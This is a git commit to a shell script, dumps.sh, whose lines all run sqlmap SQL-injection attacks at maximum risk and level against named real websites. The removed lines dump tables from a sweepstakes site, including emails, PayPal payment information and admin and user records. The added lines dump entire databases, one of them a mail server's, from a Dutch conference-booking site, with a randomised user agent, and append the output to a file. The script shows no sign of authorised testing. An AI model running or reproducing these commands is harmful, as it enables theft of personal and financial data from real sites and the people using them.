76ee2e398e386fd0a6e632a0473d6c307bfa75f8
root <root@vultr.guest>
2019-10-18 14:48:28 +0000

    data

--- dumps.sh
+++ dumps.sh
@@ -1,14 +1,5 @@
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T _emails --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T affiliate_sites  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T winprizes_bonus_entries  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T prizetune_scout  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T AdsAccounts  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T winprizes_entries  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T create_sweeps_bank  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T paypal_payment_info  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T prizetune_friend  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T prizetune_admin  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T prizetune_user  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T wpo_registration_requests  --dump
-python ../sqlmap/sqlmap.py -u https://www.winprizesonline.com/RedirectMe.php?webid=218035 --risk 3 --level 5 --batch -D winprizesonline_production -T _optout  --dump
+python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D cariat_dcb --dump >> result.txt ;
+python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D cariat_rob --dump >> result.txt ; 
+python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D hmailserver --dump >> result.txt ;
+echo "ok"
 
